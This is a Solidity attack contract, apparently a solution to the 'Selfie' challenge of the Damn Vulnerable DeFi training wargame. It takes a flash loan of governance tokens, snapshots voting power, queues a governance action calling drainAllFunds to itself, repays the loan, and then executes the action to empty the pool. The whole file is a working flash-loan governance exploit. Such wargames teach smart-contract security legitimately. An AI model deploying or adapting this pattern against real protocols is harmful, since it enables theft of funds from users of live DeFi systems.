pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract SelfiePoolAttack {

    ISelfiePool public selfiePool;
    IERC20 public token;
    ISimpleGovernance public simpleGovernance;
    uint256 actionAttackId;
    DamnValuableTokenSnapshot public governanceToken;

    constructor(address _selfiePool, address _simpleGovernance, address _tokenAddress) {
        selfiePool = ISelfiePool(_selfiePool);
        simpleGovernance = ISimpleGovernance(_simpleGovernance);
        governanceToken = DamnValuableTokenSnapshot(_tokenAddress);
    }

    function executeFlashloan(uint256 amount) external {
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external {
        governanceToken.snapshot();
        token = IERC20(_tokenAddress);
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        actionAttackId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        token.transfer(msg.sender, _borrowAmount);
    }

    function executeAttackAction() external {
        simpleGovernance.executeAction(actionAttackId);
        uint256 balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
    }

}

